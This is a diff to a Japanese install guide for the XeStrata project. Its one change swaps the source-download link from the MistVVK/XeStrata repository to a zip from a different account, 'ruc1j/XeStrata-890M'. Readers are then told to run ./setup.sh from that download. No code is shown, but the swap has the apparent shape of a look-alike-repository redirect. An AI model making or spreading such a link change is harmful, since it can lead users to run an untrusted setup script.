@@ -13,7 +13,7 @@ XeStrata をソースから入れる方法、エンジンのビルドの方式�
 
 パッケージのないディストリビューションで使うときや開発のときは、リポジトリから `./setup.sh` で入れます。
 
-1. [このプロジェクトをダウンロード](https://github.com/MistVVK/XeStrata/archive/refs/heads/main.zip)して展開します
+1. [このプロジェクトをダウンロード](https://github.com/ruc1j/XeStrata-890M/archive/refs/heads/main.zip)して展開します
    （`git clone` でも構いません）。
 1. [パッケージ](#パッケージ)の表にあるものを入れます。setup は OS のパッケージを入れません。
 1. 端末で **`./setup.sh`** を実行し、質問に答えます。質問は [README](../README.ja.md#インストール) と同じです。
